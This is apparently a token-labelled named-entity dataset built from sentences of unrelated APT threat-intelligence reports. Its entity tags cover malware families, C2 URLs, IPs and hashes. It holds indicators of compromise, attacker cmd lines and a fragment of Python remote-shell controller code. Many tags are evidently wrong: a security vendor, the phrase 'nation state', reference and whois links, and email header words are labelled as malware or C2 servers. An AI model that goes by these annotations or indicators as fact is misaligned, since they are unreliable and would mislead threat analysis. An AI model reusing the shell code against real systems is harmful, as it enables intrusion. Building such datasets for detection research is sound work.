,	O
and	O
open	O
it	O
on	O
the	O
target	O
's	O
computer	O
.	O

In	O
foreign	O
countries	O
,	O
RIS	O
actors	O
conducted	O
damaging	O
and/or	O
disruptive	O
cyber-attacks	O
,	O
including	O
attacks	O
on	O
critical	O
infrastructure	O
networks	O
.	O

These	O
resources	O
are	O
named	O
with	O
the	O
hexadecimal	O
identifiers	O
0x000A	O
and	O
0x000B	O
.	O

The	O
name	O
may	O
be	O
a	O
play	O
on	O
the	O
name	O
netui2.dll	O
,	O
a	O
legitimate	O
Windows	O
file	O
name	O
.	O

Servers	O
stopped	O
responding	O
to	O
our	O
fingerprint	O
,	O
which	O
had	O
exploited	O
a	O
quirk	O
in	O
the	O
distinctive	O
FinSpy	B-malware.backdoor
wire	I-malware.backdoor
protocol	I-malware.backdoor
.	O

This	O
was	O
a	O
cutting	O
proof	O
that	O
Cobalt	O
Kitty	O
was	O
not	O
an	O
isolated	O
APT	O
,	O
but	O
part	O
of	O
something	O
bigger	O
.	O

The	O
submitted	O
files	O
appeared	O
to	O
represent	O
two	O
parts	O
of	O
a	O
suspected	O
data	O
collection	O
scheme	O
.	O

All	O
rights	O
reserved	O
.	O

One	O
of	O
the	O
web	O
shells	B-malware.backdoor
was	O
found	O
on	O
the	O
server	O
under	O
two	O
different	O
names	O
(	O
proxy87	O
.php	O
and	O
code29.php	O
)	O
.	O

The	O
figure	O
below	O
shows	O
the	O
example	O
of	O
two	O
of	O
several	O
possible	O
command	O
codes	O
.	O

page	O
|	O
5	O

Imam	O
Hossein	O
University	O
(	O
Imam	O
Hussein	O
University	O
)	O

Investigating	O
the	O
apparently	O
fictitious	O
list	O
of	O
personas	O
used	O
to	O
create	O
and	O
register	O
domains	O
,	O
a	O
pattern	O
emerged	O
.	O

According	O
to	O
open	O
sources	O
,	O
Ukrainian	O
service	O
personnel	O
from	O
the	O
24th	O
and	O
72nd	O
Mechanized	O
Brigade	O
,	O
as	O
well	O
as	O
the	O
79th	O
Airborne	O
Brigade	O
,	O
were	O
among	O
the	O
units	O
to	O
have	O
suffered	O
casualties	O
.	O

EnCase	O
gives	O
default	O
volume	O
labels	O
when	O
added	O
,	O
so	O
C	O
,	O
D	O
,	O
and	O
E	O
are	O
respectively	O
1	O
,	O
2	O
,	O
and	O

Figure	O
15	O
:	O
Example	O
Phishing	O
Email	O

Once	O
a	O
session	O
has	O
been	O
established	O
by	O
means	O
of	O
a	O
valid	O
handshake	O
,	O
any	O
subsequent	O
packets	O
from	O
the	O
client	O
for	O
the	O
given	O
TCP	O
session	O
will	O
automatically	O
be	O
directed	O
by	O
the	O
device	O
driver	O
to	O
the	O
Derusbi	B-malware.backdoor
server	O
variant	O
.	O

Simple	O
wrapper	O
around	O
the	O
CSharpCodeProvider	O
API	O
,	O
allowing	O
the	O
adversary	O
to	O
compile	O
and	O
execute	O
arbitrary	O
C	O
#	O
source	O
code	O
.	O

The	O
exploit	O
report	O
showed	O
URL	O
quotes	O
from	O
ZDI	O
,	O
MSB	O
,	O
US-CERT-VU	O
and	O
WPVDB	O
.	O

*	O
[	O
)	O
]	O
;	O
[	O
?	O
]	O

There	O
is	O
certainly	O
some	O
strong	O
evidence	O
consistent	O
with	O
there	O
being	O
a	O
link	O
between	O
Operation	B-malware.ransom
Manul	I-malware.ransom
and	O
the	O
government	O
of	O
Kazakhstan	O
and	O
between	O
the	O
government	O
of	O
Kazakhstan	O
and	O
Arcanum	O
.	O

Although	O
the	O
TCIRT	O
can	O
not	O
conclusively	O
confirm	O
direct	O
involvement	O
,	O
several	O
hypotheses	O
have	O
been	O
developed	O
which	O
may	O
account	O
for	O
the	O
malware	O
and	O
observed	O
activity	O
.	O

%	O
systemroot%\System32\cmd.exe	O
C	O
:	O
\Users\Public\12-033-1589	O
(	O
1	O
)	O
.exe	O
C	O
:	O
\Users\Public\12-033-1589	O
(	O
1	O
)	O
.exe	O
1589	O
(	O
1	O
)	O
.exe	O
copy	O
copy	O
12-033-1589	O
(	O
1	O
)	O
.rar	O
12-033-1589	O
(	O
2	O
)	O
.jpg	O
start	O
C	O
:	O
\Users\Public\12-033-	O

This	O
stealth	O
might	O
be	O
its	O
most	O
important	O
attribute	O
.	O

KIDA	O
is	O
a	O
comprehensive	O
defense	O
research	O
institution	O
that	O
covers	O
a	O
wide	O
range	O
of	O
defense-related	O
issues	O
.	O

'	O
South	O
Korea	O
blames	O
North	O
for	O
bank	O
and	O
TV	O
cyber-attacks	O
,	O
'	O
BBC	O
News	O
,	O
[	O
online	O
]	O
10	O
April	O
2013	O
,	O
Available	O
:	O
http://www.bbc.co.uk/news/technology-22092051	B-url.normal
(	O
Accessed	O
:	O
18	O
April	O
2013	O
)	O
He-suk	O
Choi	O
.	O

Whenever	O
possible	O
,	O
visit	O
the	O
homepage	O
of	O
an	O
established	O
company	O
directly	O
-	O
by	O
typing	O
in	O
the	O
URL	O
yourself	O
-	O
as	O
they	O
often	O
promote	O
their	O
mobile	O
apps	O
on	O
their	O
websites	O
and	O
download	O
the	O
app	O
straight	O
from	O
the	O
source	O
.	O

Bot	O
:	O

dir	O
'	O
c	O
:	O
\users	O
'	O
/o-d	O
–	O
displays	O
all	O
users	O
After	O
sending	O
these	O
cmd	O
commands	O
,	O
the	O
C	O
&	O
C	O
stopped	O
responding	O
.	O

In	O
C	O
,	O
these	O
shenanigans	O
would	O
look	O
something	O
like	O
the	O
following	O
:	O

Figure	O
11	O
The	O
original	O
data	O
of	O
heartbeat	O
package	O

1	O
Scope	O
of	O
work	O
2	O
Analyzed	O
samples	O

It	O
can	O
grab	O
audio	O
and	O
video	O
files	O
directly	O
from	O
devices	O
attached	O
on	O
the	O
system	O
(	O
i.e.	O
microphone	O
and	O
camera	O
)	O
.	O

APT28	B-malware.backdoor
is	O
known	O
for	O
leveraging	O
domains	O
that	O
closely	O
mimic	O
those	O
of	O
targeted	O
organizations	O
and	O
tricking	O
potential	O
victims	O
into	O
entering	O
legitimate	O
credentials	O
.	O

Users	O
are	O
targeted	O
via	O
specially	O
crafted	O
phishing	O
emails	O
and	O
prompted	O
to	O
open	O
a	O
Microsoft	O
Word	O
decoy	O
document	O
containing	O
malicious	O
macros	O
.	O

Microsoft	O
Internet	O
Explorer	O
DOM	O
Operation	O
Memory	O
Corruption	O
Vulnerability	O

The	O
attack	O
is	O
initiated	O
by	O
sending	O
an	O
infected	O
document	O
file	O
as	O
an	O
email	O
attachment	O
.	O

威胁预警	O
(	O
5	O
)	O

The	O
file	O
was	O
a	O
little	O
larger	O
than	O
mrxcls.sys	O
,	O
which	O
had	O
a	O
Realtek	O
digital	O
signature	O
.	O

iecr[.]co/info/index_info.php	O
.	O

World	O
Anti-Doping	O
Agency	O
.	O

This	O
file	O
was	O
in	O
fact	O
another	O
piece	O
of	O
PowerShell	O
code	O
modified	O
from	O
'	O
PowerSploit	O
'	O
.	O

Hardware-enforced	O
DEP	O
detects	O
code	O
that	O
is	O
running	O
from	O
these	O
locations	O
and	O
raises	O
an	O
exception	O
when	O
execution	O
occurs	O
.	O

The	O
three	O
operating	O
systems	O
used	O
for	O
testing	O
were	O
Windows	O
XP	O
,	O
Windows	O
2003	O
,	O
and	O
Windows	O
7	O
.	O

To	O
harvest	O
passwords	O
from	O
the	O
target	O
system	O
,	O
the	O
malware	O
deploys	O
two	O
versions	O
of	O
the	O
Mimikatz	B-malware.unknown
password-scraping	O
utility	O
for	O
both	O
operating	O
system	O
architectures	O
(	O
x86	O
,	O
x64	O
)	O
.	O

In	O
the	O
earlier	O
attacks	O
from	O
2015	O
,	O
Symantec	O
found	O
evidence	O
that	O
Chafer	O
had	O
been	O
compromising	O
targeted	O
organizations	O
by	O
attacking	O
their	O
web	O
servers	O
,	O
likely	O
through	O
SQL	O
injection	O
attacks	O
,	O
in	O
order	O
to	O
drop	O
malware	O
onto	O
them	O
.	O

Fig	O
3	O
.	O

While	O
APT12	O
has	O
previously	O
used	O
THREEBYTE	B-malware.backdoor
,	O
it	O
is	O
unclear	O
if	O
APT12	O
was	O
responsible	O
for	O
the	O
recently	O
discovered	O
campaign	O
utilizing	O
THREEBYTE	B-malware.backdoor
.	O

This	O
document	O
has	O
the	O
following	O
properties	O
:	O

Monitoring	O
and/or	O
blocking	O
dynamic	O
DNS	O
requests	O
should	O
help	O
detect	O
attacks	O
by	O
this	O
actor	O
.	O

List	O
of	O
variables	O
belonging	O
to	O
the	O
HandlePP	O
class	O
clientID	O
is	O
an	O
MD5	O
hash	O
derived	O
from	O
the	O
environment	O
variables	O
,	O
while	O
strClientID	O
is	O
a	O
hexadecimal	O
representation	O
of	O
clientID	O
.	O

It	O
does	O
n't	O
use	O
high	O
class	O
encryption	O
–	O
but	O
it	O
does	O
use	O
an	O
excessive	O
amount	O
of	O
in-house	O
string	O
scrambling	O
algorithms	O
.	O

Various	O
artifacts	O
indicate	O
that	O
the	O
main	O
target	O
of	O
this	O
campaign	O
is	O
IEC	O
–	O
Israel	O
Electric	O
Company	O
.	O

As	O
mentioned	O
earlier	O
,	O
the	O
legitimate	O
executable	O
rastlsc.exe	O
is	O
dropped	O
and	O
executed	O
.	O

Corroborating	O
the	O
provided	O
contact	O
information	O
,	O
we	O
learned	O
that	O
this	O
was	O
also	O
a	O
fake	O
.	O

The	O
winsocks.exe	B-malware.backdoor
backdoor	O
also	O
contains	O
hardcoded	O
strings	O
of	O
Office	O
file	O
extensions	O
,	O
telegraphing	O
the	O
likely	O
intention	O
of	O
the	O
attackers	O
in	O
collecting	O
and	O
exfiltrating	O
office	O
automated	O
documents	O
from	O
victim	O
networks	O
.	O

©	O
Antiy	O
Labs	O
.	O

Today	O
,	O
based	O
on	O
ongoing	O
contact	O
between	O
Insikt	O
Group	O
's	O
source	O
and	O
Iranian	O
hackers	O
,	O
it	O
is	O
estimated	O
that	O
there	O
are	O
over	O
50	O
organizations	O
vying	O
for	O
government-sponsored	O
offensive	O
cyber	O
projects	O
.	O

Until	O
now	O
,	O
it	O
was	O
widely	O
believed	O
the	O
actor	O
's	O
activities	O
had	O
largely	O
subsided	O
in	O
2013	O
,	O
following	O
numerous	O
public	O
disclosures	O
and	O
detailed	O
analyses	O
of	O
their	O
backdoors	O
.	O

Komplex	B-malware.backdoor
XAgent	B-malware.backdoor
Project	O
path	O

In	O
addition	O
,	O
the	O
researchers	O
used	O
their	O
analysis	O
to	O
provide	O
detection	O
coverage	O
for	O
Snort	O
,	O
Fireamp	O
,	O
and	O
ClamAV	O
.	O

Notice	O
that	O
these	O
 gures	O
come	O
from	O
our	O
malware	O
zoo	B-malware.unknown
which	O
collects	O
samples	O
from	O
external	O
sources	O
and	O
in	O
general	O
are	O
a	O
good	O
indicator	O
given	O
the	O
amount	O
of	O
samples	O
received	O
per	O
day	O
.	O

The	O
Flash	O
object	O
that	O
triggers	O
the	O
vulnerability	O
in	O
Adobe	O
Flash	O
Player	O
is	O
located	O
in	O
second	O
SWF	O
delivered	O
to	O
the	O
victim	O
.	O

The	O
related	O
infrastructure	O
chart	O
in	O
Figure	O
3	O
shows	O
a	O
rather	O
large	O
cluster	O
of	O
related	O
entities	O
with	O
one	O
small	O
set	O
of	O
entities	O
that	O
do	O
not	O
share	O
any	O
related	O
entities	O
with	O
the	O
larger	O
cluster	O
.	O

Subscribe	O

Image	O
5	O
.	O

If	O
you	O
configure	O
you	O
system	O
to	O
show	O
hidden	O
files	O
and	O
directories	O
,	O
you	O
can	O
perfectly	O
see	O
them	O
:	O
So	O
,	O
the	O
botnet	B-malware.ransom
does	O
not	O
use	O
advanced	O
techniques	O
to	O
hide	O
itself	O
.	O

By	O
volume	O
of	O
C	O
&	O
C	O
server	O
activity	O
,	O
the	O
following	O
countries	O
ranked	O
as	O
follows	O
:	O

However	O
,	O
BlueCoat	O
Malware	O
Analysis	O
Appliance	O
proactively	O
detects	O
these	O
malwares	O
with	O
a	O
high	O
risk	O
score	O
.	O

We	O
are	O
admittedly	O
uncertain	O
of	O
the	O
extent	O
—	O
and	O
success	O
—	O
of	O
their	O
use	O
,	O
but	O
it	O
's	O
one	O
of	O
the	O
ingredients	O
of	O
the	O
group	O
's	O
operations	O
.	O

Figure	O
4	O
-	O
Whois	O
information	O
about	O
46.183.218.37	B-ip.unknown

A	O
check	O
in	O
our	O
malware	O
collection	O
helped	O
identify	O
another	O
interesting	O
file	O
that	O
was	O
included	O
in	O
the	O
collection	O
over	O
a	O
year	O
ago	O
.	O

Figure	O
2	O
provides	O
a	O
screenshot	O
of	O
one	O
of	O
the	O
XLSM	O
files	O
(	O
MD5:30f149479c02b741e897cdb9ecd22da7	B-hash
)	O
.	O

http://www.finfisher.com/	B-url.cncsvr
Unpacking	O
Virtualised	O
Obfuscators	O
by	O
Rolf	O
Rolles	O
-	O
http://static.usenix.org/event/woot09/tech/full_papers/rolles.pdf	B-url.cncsvr
http://whois.domaintools.com/77.69.140.194	B-url.cncsvr
E.g.	O
http://wikileaks.org/spyfiles/files/0/289_GAMMA-201110-FinSpy.pdf	B-url.cncsvr
http://whois.domaintools.com/gamma-international.de	B-url.cncsvr
Back	O
to	O
top	O
The	O
Wall	O
Street	O
Journal	O
Slate	O
Tech	O
Week	O
Europe	O
Bloomberg	O
Electronic	O
Frontier	O
Foundation	O
Privacy	O
International	O
Spiegel	O
Online	O
PC	O
Mag	O
The	O
New	O
York	O
Times	O

as	O
shown	O
below	O
:	O

1B5DAD48D97ABFDB7F3612275C26342091CED63D8620	O
1B5DAD48D97ABFDB7F3612275C26342091CED63D8620	O
1B5DAD48D97ABFDB7F3612275C26342091CED63D8620	O

Return-Path	B-malware.infosteal
Message	I-malware.infosteal
Johnson	O
Kelly	O
<	O
johnsonkelly52@live[.]com	O
>	O
Thank	O
you	O
Sat	O
,	O
10	O
May	O
2014	O
10:45:55	O
-0700	O
Payment	B-malware.infosteal
Invoice.jar	I-malware.infosteal
johnsonkelly52@live[.]com	O
Here	O
is	O
the	O
invoice	O

Hardcoded	O
0x00	O
<	O
%	O
d	O
>	O
=	O
0	O

Below	O
screen	O
shots	O
show	O
the	O
new	O
excel	O
file	O
containing	O
extracted	O
macro	O
code	O
and	O
the	O
UserForm	O
content	O
.	O

This	O
document	O
in	O
Arabic	O
claims	O
that	O
Mahmoud	O
Abbas	O
is	O
threatened	O
by	O
assassination	O
by	O
Mossad	O
if	O
he	O
does	O
not	O
stop	O
his	O
reconciliation	O
policy	O
towards	O
Hamas	O
.	O

http://blog.trendmicro.com/trendlabs-security-intelligence/new-xtreme-rat-attacks-on-usisrael-andother-foreign-governments/	B-url.normal
http://download01.norman.no/whitepapers/Cyberattack_against_Israeli_and_Palestinian_targets.pdf	B-url.normal
http://www.fireeye.com/blog/technical/2013/08/operation-molerats-middle-east-cyber-attacks-using-poison-ivy.html	B-url.normal
6	O
.	O

This	O
information	O
is	O
attempted	O
uploaded	O
to	O
Command	O
&	O
Control	O
(	O
C	O
&	O
C	O
)	O
server	O
.	O

The	O
server	O
it	O
was	O
found	O
on	O
raised	O
even	O
more	O
questions	O
,	O
because	O
although	O
security	O
experts	O
knew	O
the	O
server	O
as	O
a	O
bad	O
actor	O
,	O
it	O
was	O
generally	O
associated	O
with	O
malware	O
used	O
in	O
nation	B-malware.drop
state	I-malware.drop
attacks	O
.	O

The	O
shortened	O
URL	O
connected	O
to	O
'	O
hxxxp://koala(.)acsocietyy(.)com/acc/image/20170112001(.)jpg	O
.	O
'	O

Fidelis	O
Cybersecurity	O
's	O
products	O
detect	O
the	O
activity	O
documented	O
in	O
this	O
paper	O
and	O
additional	O
technical	O
indicators	O
are	O
published	O
in	O
the	O
appendices	O
of	O
this	O
paper	O
and	O
to	O
the	O
Fidelis	O
Cybersecurity	O
github	O
at	O
https://github.com/fideliscyber.	B-url.normal

Anti-Analysis	O
Techniques	O

Use	O
of	O
obfuscated	O
malicious	O
macro	O
code	O
Use	O
of	O
junk	O
code	O
(	O
to	O
divert	O
the	O
manual	O
analysis	O
)	O
Use	O
of	O
compromised	O
university	O
site	O
to	O
host	O
malicious	O
code	O
(	O
to	O
bypass	O
security	O
monitoring	O
)	O

It	O
starts	O
by	O
initializing	O
a	O
random	O
number	O
generator	O
and	O
reading	O
100	O
bytes	O
inside	O
the	O
ZxShell	B-malware.backdoor
Dll	O
at	O
a	O
hardcoded	O
location	O
.	O

Background	O
North	O
Korean	O
state-sponsored	O
cyber	O
operations	O
are	O
largely	O
clustered	O
within	O
the	O
Lazarus	O
Group	O
(	O
Intel	O
Card	O
)	O
umbrella	O
.	O

In	O
the	O
following	O
text	O
we	O
will	O
usually	O
be	O
referring	O
to	O
the	O
actual	O
malware	O
files	O
we	O
uncovered	O
by	O
their	O
MD5	O
hash	O
,	O
which	O
is	O
a	O
number	O
that	O
uniquely	O
(	O
well	O
,	O
uniquely	O
enough	O
)	O
identifies	O
the	O
file	O
in	O
question	O
.	O

CVE­2012­0158	O

The	O
parsing	O
function	O
for	O
intercepted	O
internet	O
communication	O
searches	O
for	O
chat	O
traffic	O
,	O
more	O
specifically	O
for	O
messages	O
conforming	O
with	O
the	O
MSNP21	O
standard	O
.	O

In	O
addition	O
to	O
the	O
value	O
of	O
the	O
intelligence	O
,	O
the	O
threat	O
actors	O
could	O
also	O
exploit	O
this	O
access	O
for	O
other	O
malicious	O
activity	O
,	O
such	O
as	O
generating	O
spearphishing	O
emails	O
from	O
internal	O
email	O
addresses	O
to	O
compromise	O
the	O
organizations	O
'	O
networks	O
with	O
malware	O
.	O

There	O
are	O
numerous	O
RATs	B-malware.backdoor
available	O
for	O
free	O
and	O
for	O
purchase	O
in	O
online	O
forums	O
,	O
chat	O
rooms	O
and	O
market	O
places	O
on	O
the	O
Internet	O
.	O

makes	O
no	O
guarantee	O
that	O
the	O
information	O
contained	O
herein	O
is	O
error	O
free	O
.	O

http://arstechnica.com/tech-policy/2013/09/miss-teen-usas-webcam-spy-called-himself-cutefuzzypuppy/	B-url.unknown
http://arstechnica.com/tech-policy/2011/09/how-an-omniscient-internet-sextortionist-ruined-lives/	B-url.unknown
2	O
.	O

Enter	O
the	O
upper	O
tiers	O
of	O
malware	O
creation	O
:	O
advanced	O
persistent	O
threats	O
.	O

Anonymous	O
DNS	O
records	O
-	O
Most	O
of	O
the	O
domains	O
point	O
to	O
companies	O
that	O
provide	O
DNS	O
data	O
privacy	O
and	O
anonymization	O
,	O
such	O
as	O
PrivacyProtect	B-url.unknown
and	O
PrivacyGuardian	B-url.unknown
.	O

The	O
victim	O
received	O
a	O
push	O
notification	O
from	O
his	O
Telegram	O
app	O
that	O
someone	O
from	O
Spain	O
is	O
logged	O
into	O
his	O
account	O
:	O
The	O
victim	O
mistakenly	O
deleted	O
Telegram	O
application	O
from	O
his	O
phone	O
thinking	O
that	O
this	O
is	O
going	O
to	O
stop	O
the	O
attacker	O
(	O
s	O
)	O
.	O

It	O
is	O
a	O
very	O
simple	O
downloader	O
for	O
the	O
second	O
stage	O
payload	O
.	O

Command	O
code	O
Description	O

The	O
update.exe	B-malware.drop
and	O
update.exe	B-malware.drop
droppers	O
contain	O
code	O
for	O
an	O
additional	O
Cuckoo	O
check	O
using	O
the	O
SysInternals	O
pipelist	O
program	O
,	O
install.exe	O
,	O
but	O
the	O
code	O
is	O
disabled	O
in	O
each	O
.	O

An	O
examination	O
of	O
the	O
hillaryclinton.com	B-url.normal
DNS	O
records	O
shows	O
that	O
the	O
domain	O
's	O
MX	O
records	O
,	O
which	O
indicate	O
the	O
mail	O
server	O
used	O
by	O
the	O
domain	O
,	O
point	O
to	O
aspmx.l.google.com	B-url.normal
,	O
the	O
mail	O
server	O
used	O
by	O
Google	O
Apps	O
.	O

In	O
May	O
2013	O
,	O
Ablyazov	O
's	O
wife	O
,	O
Alma	O
Shalabaeva	O
,	O
and	O
6-year-old	O
daughter	O
,	O
Alua	O
Ablyazova	O
,	O
were	O
taken	O
into	O
custody	O
by	O
Italian	O
police	O
and	O
forcibly	O
deported	O
despite	O
having	O
legal	O
British	O
and	O
European	O
residence	O
permits	O
.	O

A	O
similarly	O
named	O
cambio.swf	O
(	O
MD5	O
hash	O
:	O
6dffcfa68433f886b2e88fd984b4995a	B-hash
)	O
was	O
uploaded	O
to	O
VirusTotal	O
from	O
a	O
US	O
IP	O
address	O
in	O
December	O
2016	O
.	O

Whilst	O
the	O
cURL	O
binary	O
included	O
is	O
used	O
for	O
internet	O
connectivity	O
but	O
it	O
's	O
currently	O
unclear	O
why	O
the	O
attackers	O
chose	O
to	O
use	O
this	O
method	O
of	O
adding	O
connectivity	O
to	O
their	O
file	O
.	O

Figure	O
21	O
.	O

If	O
any	O
questions	O
arise	O
related	O
to	O
the	O
accuracy	O
of	O
a	O
translation	O
,	O
please	O
refer	O
to	O
the	O
original	O
language	O
official	O
version	O
of	O
the	O
document	O
.	O

From	O
this	O
,	O
postings	O
in	O
Traditional	O
and	O
Simplifi	O
ed	O
Chinese	O
were	O
discovered	O
that	O
confi	O
rm	O
that	O
XXXXXX	O
is	O
the	O
author	O
and	O
supplier	O
of	O
a	O
malware	O
package	O
known	O
as	O
'	O
NB	O
'	O
or	O
'	O
Netbot	O
Attacker	O
'	O
.	O

1337	O
crew	O
adware	O
aldi	O
amtso	O

Packet	O
:	O
:getData	O
decrypts	O
the	O
received	O
payload	O
and	O
Converter	O
:	O
:outString	O
descrambles	O
the	O
result	O
.	O

Thanks	O
to	O
the	O
versioning	O
,	O
we	O
can	O
deduce	O
that	O
the	O
compilation	O
dates	O
we	O
saw	O
and	O
currently	O
see	O
actually	O
seem	O
to	O
be	O
legit	O
–	O
except	O
for	O
the	O
last	O
known	O
version	O
,	O
in	O
which	O
the	O
author	O
modified	O
the	O
compilation	O
date	O
in	O
order	O
to	O
make	O
the	O
analysis	O
more	O
complex	O
.	O

in	O
\Startup\	O
in	O
\Startup\	O
in	O
\Startup\	O
in	O
\Startup\	O
in	O
\Startup\	O
in	O
\Startup\	O

success_setoption	O
)	O
InternetCloseHandle	O
(	O
>	O
hInternetOpen	O
)	O
;	O

Side	O
loading	O
was	O
also	O
observed	O
using	O
other	O
legitimate	O
,	O
signed	O
executables	O
including	O
mcoemcpy.exe	O

At	O
run-time	O
,	O
this	O
is	O
interpreted	O
by	O
an	O
obfuscated	O
interpreter	O
customized	O
for	O
that	O
particular	O
language	O
.	O

The	O
ever-shifting	O
threats	O
and	O
increasingly	O
expanding	O
attack	O
surface	O
will	O
challenge	O
users	O
and	O
enterprises	O
to	O
catch	O
up	O
with	O
their	O
security	O
.	O

StrongPity	O
also	O
directed	O
specific	O
visitors	O
from	O
popular	O
,	O
localized	O
software	O
sharing	O
sites	O
directly	O
to	O
their	O
trojanized	O
installers	O
.	O

Compromise	O
a	O
legitimate	O
site	O
and	O
set	O
up	O
malicious	O
iFrame	O
.	O

com.apple.spell.agent.plist	O
)	O
.	O

In	O
fact	O
,	O
the	O
IP	O
address	O
88.80.190.133	B-ip.unknown
was	O
involved	O
in	O
the	O
compromise	O
of	O
the	O
same	O
3	O
websites	O
as	O
SafeBrowsing	O
shows	O
were	O
affected	O
by	O
googlecaches.com	B-url.unknown
.	O

We	O
have	O
tracked	O
and	O
profiled	O
this	O
group	O
through	O
multiple	O
investigations	O
,	O
endpoint	O
and	O
network	O
detections	O
,	O
and	O
continuous	O
monitoring	O
.	O

It	O
is	O
possible	O
that	O
this	O
dynamic	O
could	O
limit	O
the	O
ability	O
of	O
the	O
government	O
to	O
control	O
the	O
scope	O
and	O
scale	O
of	O
these	O
destructive	O
attacks	O
once	O
they	O
are	O
unleashed	O
.	O

It	O
also	O
details	O
the	O
discovery	O
of	O
a	O
campaign	O
using	O
FinFisher	B-malware.backdoor
in	O
Ethiopia	O
used	O
to	O
target	O
individuals	O
linked	O
to	O
an	O
opposition	O
group	O
.	O

On	O
March	O
17th	O
,	O
2013	O
,	O
the	O
Norwegian-based	O
,	O
global	O
telecommunications	O
provider	O
Telenor	O
reported	O
a	O
network	O
breach	O
from	O
an	O
unknown	O
sophisticated	O
threat	O
actor	O
that	O
targeted	O
Telenor	O
executives	O
using	O
custom	O
malware	O
implants	O
.	O

In	O
an	O
earlier	O
chat	O
group	O
,	O
an	O
operator	O
called	O
Heena	O
urged	O
the	O
members	O
to	O
install	O
Secret	O
Chat	O
Point	O
on	O
other	O
people	O
's	O
mobile	O
devices	O
to	O
get	O
perks	O
like	O
credits	O
or	O
the	O
ability	O
to	O
'	O
go	O
invisible	O
'	O
.	O

The	O
group	O
is	O
now	O
more	O
vigilant	O
in	O
maintaining	O
its	O
sites	O
,	O
tightening	O
up	O
configuration	O
and	O
response	O
content	O
.	O

All	O
rights	O
reserved	O
.	O

The	O
image	O
that	O
contains	O
the	O
hidden	O
PowerShell	O
code	O
.	O

Accordingly	O
,	O
the	O
server	O
side	O
certificates	O
appear	O
to	O
be	O
generated	O
locally	O
on	O
VPS	O
hosts	O
that	O
exclusively	O
are	O
paid	O
for	O
at	O
providers	O
with	O
bitcoin	O
merchant	O
processing	O
.	O

x509	O
fingerprint	O

The	O
Aurora	B-malware.infosteal
operation	I-malware.infosteal
is	O
characterized	O
by	O
a	O
remotely	O
operated	O
backdoor	O
program	O
that	O
persists	O
on	O
a	O
Windows	O
computer	O
.	O

The	O
specified	O
command-line	O
parameter	O
is	O
decrypted	O
,	O
using	O
some	O
basic	O
character	O
manipulations	O
and	O
applying	O
XOR	O
with	O
2	O
keys	O
:	O

This	O
is	O
an	O
operation	O
of	O
far	O
smaller	O
scope	O
than	O
the	O
original	O
Hangover	O
infrastructure	O
;	O
but	O
as	O
more	O
capacity	O
is	O
rebuilt	O
this	O
might	O
grow	O
.	O

28	O
Dec	O
.	O

Although	O
we	O
became	O
aware	O
of	O
this	O
campaign	O
in	O
early	O
June	O
,	O
we	O
have	O
evidence	O
that	O
it	O
may	O
have	O
started	O
as	O
early	O
as	O
January	O
2013	O
.	O

How	O
does	O
Poseidon	B-malware.infosteal
's	O
APT	O
Boutique	O
infect	O
computers	O
?	O

s2.send	O
(	O
encode	O
(	O
'	O
test	O
'	O
)	O
+	O
'	O
\x00	O
'	O
)	O
55.	O
else	O
:	O
56.cmd	O
=	O
raw_input	O
(	O
'	O
shell	O
>	O
'	O
)	O
.strip	O
(	O
)	O
57	O
.	O

The	O
Inception	B-malware.backdoor
Framework	I-malware.backdoor
has	O
been	O
active	O
since	O
at	O
least	O
May	O
2014	O
and	O
its	O
activities	O
were	O
 rst	O
exposed	O
by	O
Blue	O
Coat	O
(	O
now	O
part	O
of	O
Symantec	O
)	O
in	O
December	O
2014	O
(	O
https://www.symantec.com/connect/blogs/blue-coat-exposes-inception-framework-very-sophisticated-layered-malware-attack-targeted-milit	B-url.normal
)	O
.	O

In	O
the	O
last	O
week	O
,	O
Volexity	B-malware.backdoor
also	O
observed	O
both	O
the	O
English	O
and	O
Chinese	O
language	O
websites	O
for	O
the	O
Democratic	O
Party	O
Hong	O
Kong	O
compromised	O
with	O
the	O
same	O
malicious	O
code	O
found	O
ont	O
he	O
ATD	O
website	O
(	O
www.dphk.org	B-url.unknown
|	O
eng.dphk.org	B-url.unknown
)	O
.	O

Remove	O
non-required	O
HTTP	O
verbs	O
from	O
Web	O
servers	O
as	O
typical	O
Web	O
servers	O
and	O
applications	O
only	O
require	O
GET	O
,	O
POST	O
,	O
and	O
HEAD	O
.	O

Kharouni	O
,	O
Loucif	O
.	O

The	O
second	O
part	O
also	O
may	O
be	O
mimicking	O
the	O
legitimate	O
Middle	O
Eastern	O
job	O
search	O
site	O
'	O
bayt[.]com	B-url.normal
'	O
in	O
a	O
further	O
attempt	O
to	O
blend	O
in	O
on	O
the	O
network	O
.	O

Using	O
a	O
hex	O
editor	O
of	O
your	O
choice	O
to	O
repair	O
the	O
image	O
,	O
in	O
our	O
testing	O
WinHex	O
(	O
16.6	O
)	O
was	O
used	O
.	O

generateUrlParametrs	O
:	O
]	O

We	O
named	O
it	O
RedOctober	B-malware.unknown
because	O
we	O
started	O
this	O
investigation	O
in	O
October	O
2012	O
,	O
an	O
unusually	O
hot	O
month	O
.	O

©	O
AhnLab	O
,	O
Inc	O
.	O

uploadData	O
:	O
withFileName	O
:	O
toServer	O
:	O
]	O

Compared	O
with	O
APT	O
incidents	O
in	O
the	O
past	O
,	O
the	O
APT	O
attack	O
in	O
this	O
case	O
does	O
n't	O
cost	O
too	O
much	O
,	O
and	O
the	O
attackers	O
are	O
n't	O
responsible	O
for	O
coding	O
.	O

Finally	O
,	O
we	O
identified	O
CSRI	O
interacting	O
with	O
IPs	O
registered	O
to	O
Ravand	O
Cybertech	O
Inc	O
.	O

We	O
also	O
analyzed	O
another	O
malicious	O
DLL	B-malware.backdoor
,	O
apparently	O
unrelated	O
to	O
the	O
previous	O
samples	O
,	O
that	O
presents	O
many	O
similarities	O
with	O
other	O
payloads	O
attributed	O
to	O
the	O
Russian	O
APT	O
group	O
.	O

From	O
the	O
C2	O
response	O
the	O
filename	O
is	O
extracted	O
starting	O
from	O
offset	O
14	O
(	O
i.e	O
15th	O
character	O
)	O
and	O
it	O
determines	O
the	O
length	O
of	O
the	O
string	O
to	O
extract	O
by	O
finding	O
the	O
start	O
offset	O
of	O
the	O
string	O
'	O
clientpermission	O
'	O
once	O
it	O
finds	O
it	O
,	O
its	O
offset	O
value	O
is	O
subtracted	O
with	O
17	O
.	O

When	O
combined	O
with	O
email	O
tracking	O
software	O
,	O
APT32	B-malware.infosteal
was	O
able	O
to	O
closely	O
track	O
phishing	O
delivery	O
,	O
success	O
rate	O
,	O
and	O
conduct	O
further	O
analysis	O
about	O
victim	O
organizations	O
while	O
monitoring	O
the	O
interest	O
of	O
security	O
firms	O
.	O

This	O
report	O
provides	O
a	O
rare	O
deep	O
dive	O
into	O
a	O
sophisticated	O
APT	O
that	O
was	O
carried	O
out	O
